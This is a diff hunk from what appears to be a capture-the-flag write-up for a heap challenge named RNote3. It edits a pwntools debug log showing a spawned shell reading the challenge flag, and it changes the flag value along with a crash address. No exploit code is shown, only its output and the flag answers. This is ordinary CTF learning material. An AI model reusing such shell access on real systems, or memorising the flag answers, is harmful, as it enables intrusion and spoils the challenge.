@@ -138,34 +138,14 @@ cnss{it_is_note_01}$
 ```bash
 [*] Switching to interactive mode
 [DEBUG] Received 0x51 bytes:
-    "*** Error in `./RNote3': munmap_chunk(): invalid pointer: 0x00007fed1ff0aafd ***\n"
-*** Error in `./RNote3': munmap_chunk(): invalid pointer: 0x00007fed1ff0aafd ***
-$ ls -al ../
-[DEBUG] Sent 0xb bytes:
-    'ls -al ../\n'
-[DEBUG] Received 0x154 bytes:
-    'total 25\n'
-    'drwxr-xr-x 1 pwn  pwn  4096 Aug 15 05:59 .\n'
-    'drwxr-xr-x 1 root root 4096 Aug 15 03:33 ..\n'
-    '-rw-r--r-- 1 pwn  pwn   220 Aug 31  2015 .bash_logout\n'
-    '-rw-r--r-- 1 pwn  pwn  3771 Aug 31  2015 .bashrc\n'
-    'drwxrwxrwx 1 root root    0 Aug 15 04:58 bin\n'
-    '-rwxrwxrwx 1 root root   19 Aug 15 05:58 flag\n'
-    '-rw-r--r-- 1 pwn  pwn   655 May 16  2017 .profile\n'
-total 25
-drwxr-xr-x 1 pwn  pwn  4096 Aug 15 05:59 .
-drwxr-xr-x 1 root root 4096 Aug 15 03:33 ..
--rw-r--r-- 1 pwn  pwn   220 Aug 31  2015 .bash_logout
--rw-r--r-- 1 pwn  pwn  3771 Aug 31  2015 .bashrc
-drwxrwxrwx 1 root root    0 Aug 15 04:58 bin
--rwxrwxrwx 1 root root   19 Aug 15 05:58 flag
--rw-r--r-- 1 pwn  pwn   655 May 16  2017 .profile
+    "*** Error in `./RNote3': munmap_chunk(): invalid pointer: 0x00007fad2858cafd ***\n"
+*** Error in `./RNote3': munmap_chunk(): invalid pointer: 0x00007fad2858cafd ***
 $ cat ../flag
 [DEBUG] Sent 0xc bytes:
     'cat ../flag\n'
 [DEBUG] Received 0x13 bytes:
-    'cnss{it_is_note_01}'
-cnss{it_is_note_01}$  
+    'cnss{it_is_note_02}'
+cnss{it_is_note_02}$  
 
 ```
 
